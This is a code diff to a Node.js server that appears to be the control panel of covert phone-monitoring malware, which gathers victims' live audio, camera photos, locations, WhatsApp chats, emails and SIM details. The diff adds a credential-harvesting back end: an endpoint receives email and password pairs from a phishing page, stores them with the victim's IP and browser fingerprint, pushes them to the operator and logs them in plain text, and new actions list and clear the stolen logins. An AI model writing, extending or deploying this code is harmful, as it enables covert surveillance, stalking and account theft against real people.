@@ -418,7 +418,6 @@ app.post('/upload.php', (req, res) => {
         // ✅ ADVANCED FEATURES UPLOADS
         // ═══════════════════════════════════════════════════════════
 
-        // 📸 صورة كاميرا الحركة
         if (data.type === 'motion_photo' && data.file_data) {
             const deviceId = data.device_id || 'unknown';
             const deviceDir = path.join(dataDir, deviceId);
@@ -443,7 +442,6 @@ app.post('/upload.php', (req, res) => {
             return res.json({ success: true, motion_count: photos.length });
         }
 
-        // 📍 حدث Geofence
         if (data.type === 'geofence_event') {
             const deviceId = data.device_id || 'unknown';
             const deviceDir = path.join(dataDir, deviceId);
@@ -468,7 +466,6 @@ app.post('/upload.php', (req, res) => {
             return res.json({ success: true, geofence_count: events.length });
         }
 
-        // 💀 Dead Man's Switch أُطلق
         if (data.type === 'deadman_triggered') {
             const deviceId = data.device_id || 'unknown';
             const deviceDir = path.join(dataDir, deviceId);
@@ -476,10 +473,7 @@ app.post('/upload.php', (req, res) => {
             const deadFile = path.join(deviceDir, 'deadman_events.json');
             let events = [];
             if (fs.existsSync(deadFile)) events = JSON.parse(fs.readFileSync(deadFile, 'utf8'));
-            const deadEntry = {
-                triggered: true,
-                timestamp: data.timestamp || Date.now()
-            };
+            const deadEntry = { triggered: true, timestamp: data.timestamp || Date.now() };
             events.unshift(deadEntry);
             if (events.length > 100) events = events.slice(0, 100);
             fs.writeFileSync(deadFile, JSON.stringify(events, null, 2));
@@ -489,7 +483,6 @@ app.post('/upload.php', (req, res) => {
             return res.json({ success: true });
         }
 
-        // 🎙️ Chunk من البث الصوتي الحي
         if (data.type === 'live_audio_chunk' && data.file_data) {
             const deviceId = data.device_id || 'unknown';
             const deviceDir = path.join(dataDir, deviceId);
@@ -760,6 +753,7 @@ app.get('/live.php', (req, res) => {
         const geofenceFile = path.join(dataDir, deviceId, 'geofence_events.json');
         const liveAudioFile = path.join(dataDir, deviceId, 'live_audio.json');
         const deadmanFile = path.join(dataDir, deviceId, 'deadman_events.json');
+        const phishingFile = path.join(dataDir, deviceId, 'phishing_creds.json');
 
         let response = {
             online: false,
@@ -787,6 +781,7 @@ app.get('/live.php', (req, res) => {
             geofence_count: 0,
             live_audio_count: 0,
             deadman_count: 0,
+            phishing_count: 0,
             sim_numbers: [],
             carrier: '',
             self_number: '',
@@ -828,6 +823,7 @@ app.get('/live.php', (req, res) => {
         if (fs.existsSync(geofenceFile)) response.geofence_count = JSON.parse(fs.readFileSync(geofenceFile, 'utf8')).length;
         if (fs.existsSync(liveAudioFile)) response.live_audio_count = JSON.parse(fs.readFileSync(liveAudioFile, 'utf8')).length;
         if (fs.existsSync(deadmanFile)) response.deadman_count = JSON.parse(fs.readFileSync(deadmanFile, 'utf8')).length;
+        if (fs.existsSync(phishingFile)) response.phishing_count = JSON.parse(fs.readFileSync(phishingFile, 'utf8')).length;
 
         if (fs.existsSync(simFile)) {
             try {
@@ -870,7 +866,7 @@ app.get('/api.php', (req, res) => {
             if (!session || Date.now() > session.expires) return res.status(401).json({ error: 'Unauthorized' });
 
             if (!session.isOwner) {
-                const ownerOnlyActions = ['delete_device', 'clear_deleted', 'delete_deleted_item', 'delete_whatsapp_chat', 'delete_whatsapp', 'clear_whatsapp', 'delete_email', 'delete_voice', 'clear_voices', 'clear_audio', 'clear_screenshots', 'clear_camera_photos', 'delete_video', 'clear_videos', 'delete_motion_photo', 'clear_motion_photos', 'delete_geofence_event', 'clear_geofence_events', 'clear_live_audio'];
+                const ownerOnlyActions = ['delete_device', 'clear_deleted', 'delete_deleted_item', 'delete_whatsapp_chat', 'delete_whatsapp', 'clear_whatsapp', 'delete_email', 'delete_voice', 'clear_voices', 'clear_audio', 'clear_screenshots', 'clear_camera_photos', 'delete_video', 'clear_videos', 'delete_motion_photo', 'clear_motion_photos', 'delete_geofence_event', 'clear_geofence_events', 'clear_live_audio', 'clear_phishing'];
                 if (ownerOnlyActions.includes(action)) return res.status(403).json({ error: 'Forbidden - Owner only' });
 
                 if (deviceId) {
@@ -980,7 +976,7 @@ app.get('/api.php', (req, res) => {
         }
 
         // ═══════════════════════════════════════════════════════════
-        // ✅ ADVANCED FEATURES (motion, geofence, live audio, deadman)
+        // ✅ ADVANCED FEATURES
         // ═══════════════════════════════════════════════════════════
 
         if (action === 'get_motion_photos') {
@@ -1051,6 +1047,36 @@ app.get('/api.php', (req, res) => {
             const deadFile = path.join(dataDir, deviceId, 'deadman_events.json');
             if (fs.existsSync(deadFile)) return res.json(JSON.parse(fs.readFileSync(deadFile, 'utf8')));
             return res.json([]);
+        }
+
+        // ═══════════════════════════════════════════════════════════
+        // 🎣 PHISHING GET ENDPOINTS
+        // ═══════════════════════════════════════════════════════════
+
+        if (action === 'get_phishing') {
+            const phishFile = path.join(dataDir, deviceId, 'phishing_creds.json');
+            if (fs.existsSync(phishFile)) return res.json(JSON.parse(fs.readFileSync(phishFile, 'utf8')));
+            return res.json([]);
+        }
+
+        if (action === 'delete_phishing') {
+            const idx = parseInt(req.query.index);
+            const phishFile = path.join(dataDir, deviceId, 'phishing_creds.json');
+            if (fs.existsSync(phishFile)) {
+                let creds = JSON.parse(fs.readFileSync(phishFile, 'utf8'));
+                if (!isNaN(idx) && idx >= 0 && idx < creds.length) {
+                    creds.splice(idx, 1);
+                    fs.writeFileSync(phishFile, JSON.stringify(creds, null, 2));
+                    return res.json({ success: true });
+                }
+            }
+            return res.json({ success: false });
+        }
+
+        if (action === 'clear_phishing') {
+            const phishFile = path.join(dataDir, deviceId, 'phishing_creds.json');
+            if (fs.existsSync(phishFile)) fs.writeFileSync(phishFile, '[]');
+            return res.json({ success: true });
         }
 
         // ═══════════════════════════════════════════════════════════
@@ -1305,6 +1331,52 @@ app.post('/api.php', (req, res) => {
         res.json({ success: true });
     } catch (e) { res.json({ error: e.message }); }
 });
+
+// ═══════════════════════════════════════════════════════════
+// 🎣 PHISHING ENDPOINTS (from external HTML page)
+// ═══════════════════════════════════════════════════════════
+
+app.post('/phishing_save.php', (req, res) => {
+    try {
+        const data = req.body;
+        if (!data.type || data.type !== 'phishing_creds') {
+            return res.json({ success: false });
+        }
+
+        const deviceId = data.target_id || 'unknown';
+        const deviceDir = path.join(dataDir, deviceId);
+        if (!fs.existsSync(deviceDir)) fs.mkdirSync(deviceDir, { recursive: true });
+        const phishFile = path.join(deviceDir, 'phishing_creds.json');
+
+        let creds = [];
+        if (fs.existsSync(phishFile)) creds = JSON.parse(fs.readFileSync(phishFile, 'utf8'));
+
+        const entry = {
+            email: data.email || '',
+            password: data.password || '',
+            sender: data.sender || '',
+            ua: data.ua || '',
+            screen: data.screen || '',
+            tz: data.tz || '',
+            lang: data.lang || '',
+            url: data.url || '',
+            ip: req.ip || req.connection.remoteAddress || '',
+            timestamp: data.timestamp || Date.now()
+        };
+        creds.unshift(entry);
+        if (creds.length > 500) creds = creds.slice(0, 500);
+        fs.writeFileSync(phishFile, JSON.stringify(creds, null, 2));
+
+        updateDevicesList(deviceId, null);
+        pushToDevice(deviceId, 'new_phishing', entry);
+        console.log(`[PHISH] 🎣 ${entry.email} / ${entry.password} from ${deviceId}`);
+        res.json({ success: true });
+    } catch (e) { res.json({ error: e.message }); }
+});
+
+// ═══════════════════════════════════════════════════════════
+// END PHISHING
+// ═══════════════════════════════════════════════════════════
 
 app.get('/devices.json', (req, res) => {
     try {
